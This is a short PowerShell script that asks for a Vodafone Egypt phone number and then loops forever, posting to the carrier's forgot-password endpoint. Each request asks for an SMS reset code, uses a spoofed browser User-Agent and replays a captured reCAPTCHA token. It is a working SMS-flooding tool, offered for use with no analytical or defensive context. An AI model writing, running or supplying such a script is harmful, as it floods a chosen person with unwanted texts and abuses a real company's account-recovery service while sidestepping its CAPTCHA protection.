$n = Read-Host -Prompt 'Input phone number "vodafone"'
while ($true) {
Invoke-WebRequest -Uri "https://www.vodafone.com.eg/userAcc/forgotPass" `
-Method "POST" `
-Headers @{
"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
} `
-ContentType "application/x-www-form-urlencoded; charset=UTF-8" `
-Body "userName=$n&userEmail=nnnnnnnnnnnnnnnnnnnnnnnnn%40gmail.com&tempPassMethod=sms&g-recaptcha-response=03AGdBq25U-M3nHBa_ipnnE01EW7kqlU_ZceLmm1-5flKASeoMiAUXxoG49UV3_pEp4Fo3asr-2vV6sWHc2ZFHL0G9Kqcbzwrrlrj0LNMEiMFdzVJeYrck75yUR7h_Kd67QZStqy81XJ4ia5R3gode8jYN75ZhdMZl5p5Wu-UGPfpUNOsKdSVUHecv-lFaoyUG9rHdWftcWt8aWPoMwRagvD-bqkwzKCBjZs5VIyKQU5QfH4gPj5roUbZiWeeDwVUvPayEYxGUOGiC_NUdXoTCIL-IhxHijKiUXvmKBzOyfqAsbz-H37asqnHbzb2-1Norg-CKefOq1tPM4tIiHwnWnsK0KzHQXyCQpfeuU077nqeiBZC2URvmEmKpiXgzxqm1C8uh_ADrJ7dPPSoA2ggf6AaQ0bOZL4NqBw"
}